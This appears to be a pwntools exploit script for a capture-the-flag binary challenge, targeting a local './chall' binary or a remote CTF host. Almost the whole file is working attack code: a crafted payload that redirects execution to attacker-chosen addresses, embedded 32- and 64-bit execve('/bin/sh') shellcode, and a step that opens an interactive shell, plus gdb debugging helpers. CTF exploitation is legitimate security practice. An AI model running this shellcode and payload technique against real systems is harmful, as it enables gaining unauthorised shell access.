from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './chall'
HOST = 'asia.pwn.zh3r0.ml'
PORT = 9653

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

_32_SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
_64_SHELLCODE = "\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

r = start()
if args.D:
    debug(r, [0x166, 0x1e2])

# 8 rdx
# 16, rsi
# payload = 'A'*8
payload = p64(0x600000)
payload += flat(0x7, 0x600030)
# payload += 'B'*0x8
payload += p64(0x1000)
payload += 'C'*0x8
payload += p32(0x4000e8)
r.sendafter('name:', payload)
# r.sendafter('name:', 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaa'+p32(0x4000e8))
payload = ''
payload += p64(0x600008)
payload += 'A'*0x28
payload += p64(0x600038)
payload += asm('xor edx,edx')+_32_SHELLCODE
payload = payload.ljust(125, 'A')
r.sendafter('feedback :', payload)

r.interactive()
r.close()
